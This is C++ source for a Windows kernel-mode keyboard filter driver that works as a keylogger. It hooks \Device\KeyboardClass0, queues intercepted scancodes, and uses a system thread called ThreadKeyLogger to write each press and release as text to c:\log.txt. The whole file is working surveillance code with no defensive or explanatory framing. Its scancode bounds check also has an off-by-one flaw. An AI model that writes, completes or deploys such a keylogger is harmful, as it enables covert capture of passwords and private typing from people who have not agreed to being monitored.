#include "KeyboardFilter.h"

HANDLE hKeysFile;

// IRQL = DISPATCH_LEVEL
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOID Context)
{
	UNREFERENCED_PARAMETER(Context);

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		unsigned int numKeys = (unsigned int)pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for (unsigned int i = 0; i < numKeys; i++)
		{
			KIRQL oldIrql;
			KeAcquireSpinLock(&pKeyboardDeviceExtension->lockQueue, &oldIrql);

			if ((pKeyboardDeviceExtension->enqueueIndex + 1) % MAXIMUM_KEY_DATA == pKeyboardDeviceExtension->dequeueIndex)
			{
				printf("Failed to enqueue keyboard\n");
			}
			else
			{
				pKeyboardDeviceExtension->keysArray[pKeyboardDeviceExtension->enqueueIndex].KeyData = (char)keys[i].MakeCode;
				pKeyboardDeviceExtension->keysArray[pKeyboardDeviceExtension->enqueueIndex].KeyFlags = (char)keys[i].Flags;
				pKeyboardDeviceExtension->enqueueIndex++;

				pKeyboardDeviceExtension->enqueueIndex = pKeyboardDeviceExtension->enqueueIndex % MAXIMUM_KEY_DATA;
			}

			KeReleaseSpinLock(&pKeyboardDeviceExtension->lockQueue, oldIrql);


			KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, FALSE);

		}
	}
	
	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	pKeyboardDeviceExtension->uNumberOfWaitingIrps--;

	return pIrp->IoStatus.Status;
}

// IRQL = DISPATCH_LEVEL
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	IoSkipCurrentIrpStackLocation(pIrp);

	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

// IRQL = DISPATCH_LEVEL
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
	*nextIrpStack = *currentIrpStack;

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	pKeyboardDeviceExtension->uNumberOfWaitingIrps++;
	pKeyboardDeviceExtension->uTotalNumber++;

	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);

	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);

	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	timeout.QuadPart = 1000000;
	KeInitializeTimer(&kTimer);

	printf("Unloading, number of IRPs %d\n", pKeyboardDeviceExtension->uNumberOfWaitingIrps);

	while (pKeyboardDeviceExtension->uNumberOfWaitingIrps > 0)
	{
		KeSetTimer(&kTimer, timeout, NULL);
		KeWaitForSingleObject(&kTimer, Executive, KernelMode, false, NULL);
	}

	IoDeleteDevice(pDriverObject->DeviceObject);

	CloseLogFile();

	printf("Unloading successfull\n");

	return;
}

extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	PDEVICE_OBJECT pKeyboardFilterDeviceObject;
	NTSTATUS status;
	
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		pDriverObject->MajorFunction[i] = DispatchPassDown;
	}
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	pDriverObject->DriverUnload = DriverUnload;

	status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, true, &pKeyboardFilterDeviceObject);
	if (!NT_SUCCESS(status))
	{
		return status;
	}

	pKeyboardFilterDeviceObject->Flags = pKeyboardFilterDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardFilterDeviceObject->Flags = pKeyboardFilterDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;

	RtlZeroMemory(pKeyboardFilterDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardFilterDeviceObject->DeviceExtension;

	KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);
	KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0, MAXLONG);

	status = OpenLogFile();
	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(pKeyboardFilterDeviceObject);
		return status;
	}

	status = SetKeyboardHook(pDriverObject, pKeyboardFilterDeviceObject);
	if (!NT_SUCCESS(status))
	{
		CloseLogFile();
		IoDeleteDevice(pKeyboardFilterDeviceObject);
		return status;
	}

	status = CreateLoggerThread(pDriverObject);
	if (!NT_SUCCESS(status))
	{
		RemoveKeyboardHook(pDriverObject);
		CloseLogFile();
		IoDeleteDevice(pKeyboardFilterDeviceObject);
		return status;
	}


	return STATUS_SUCCESS;

}

NTSTATUS SetKeyboardHook(PDRIVER_OBJECT pDriverObject, PDEVICE_OBJECT pKeyboardFilterDeviceObject)
{
	UNICODE_STRING uKeyboardDeviceName;
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	RtlInitUnicodeString(&uKeyboardDeviceName, L"\\Device\\KeyboardClass0");
	NTSTATUS status = IoAttachDevice(pKeyboardFilterDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);

	return status;

}

NTSTATUS RemoveKeyboardHook(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);

	return STATUS_SUCCESS;
}

NTSTATUS CreateLoggerThread(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	pKeyboardDeviceExtension->bThreadTerminate = false;

	HANDLE hThread;
	NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadKeyLogger, pKeyboardDeviceExtension);

	if (!NT_SUCCESS(status))
		return status;

	ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);

	ZwClose(hThread);

	return status;
}

VOID ThreadKeyLogger(IN PVOID pContext)
{
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;

	while (true)
	{
		bool bNewData = false;
		KEY_DATA kData = {};

		KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue, Executive, KernelMode, FALSE, NULL);

		KIRQL oldIrql;
		
		// DISPATCH_LEVEL - can't perform IO operations
		KeAcquireSpinLock(&pKeyboardDeviceExtension->lockQueue, &oldIrql);
		if (pKeyboardDeviceExtension->enqueueIndex == pKeyboardDeviceExtension->dequeueIndex)
		{
			printf("Failed to dequeue keyboard\n");
		}
		else
		{
			kData.KeyData = pKeyboardDeviceExtension->keysArray[pKeyboardDeviceExtension->dequeueIndex].KeyData;
			kData.KeyFlags = pKeyboardDeviceExtension->keysArray[pKeyboardDeviceExtension->dequeueIndex].KeyFlags;

			pKeyboardDeviceExtension->dequeueIndex++;
			pKeyboardDeviceExtension->dequeueIndex = pKeyboardDeviceExtension->dequeueIndex % MAXIMUM_KEY_DATA;

			printf("Got data: %x\n", kData.KeyData);
			bNewData = true;
		}
		
		// PASIVE_LEVEL
		KeReleaseSpinLock(&pKeyboardDeviceExtension->lockQueue, oldIrql);

		// Return to PASSIVE_LEVEL in order to perform IO operations
		if (bNewData)
		{
			// KeyFlags == 0 meaning the key was pressed
			NTSTATUS status = WriteLogFile(kData.KeyFlags == 0, kData.KeyData);
			printf("WriteLogFile - %x - %x\n", status, kData.KeyFlags);
		}


		if (pKeyboardDeviceExtension->bThreadTerminate == true)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}
		
	}

	return;
}

NTSTATUS OpenLogFile() {

	IO_STATUS_BLOCK ioStatusBlock;
	OBJECT_ATTRIBUTES fileObjectAttributes;
	NTSTATUS status;
	UNICODE_STRING fileName;

	RtlInitUnicodeString(&fileName, L"\\DosDevices\\c:\\log.txt");

	InitializeObjectAttributes(
		&fileObjectAttributes,
		&fileName,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	status = ZwCreateFile(&hKeysFile, GENERIC_WRITE, &fileObjectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	
	return status;
}

NTSTATUS CloseLogFile()
{
	return ZwClose(hKeysFile);
}

NTSTATUS WriteLogFile(bool is_pressed, char scancode)
{
	IO_STATUS_BLOCK isb;
	NTSTATUS status;

	if (scancode > (sizeof(KEY_MAP) / sizeof(const char*)))
	{
		return STATUS_BAD_KEY;
	}

	PVOID textcode = (const PVOID)KEY_MAP[scancode];

	if (is_pressed)
	{
		ZwWriteFile(hKeysFile, NULL, NULL, NULL, &isb, "Pressed ", sizeof("Pressed ") - 1, NULL, NULL);
	}
	else
	{
		ZwWriteFile(hKeysFile, NULL, NULL, NULL, &isb, "Released ", sizeof("Released ") - 1, NULL, NULL);
	}

	status = ZwWriteFile(hKeysFile, NULL, NULL, NULL, &isb, textcode, (ULONG)strlen(KEY_MAP[scancode]), NULL, NULL);
	
	char newLine = '\n';
	ZwWriteFile(hKeysFile, NULL, NULL, NULL, &isb, &newLine, 1, NULL, NULL);

	return status;


}
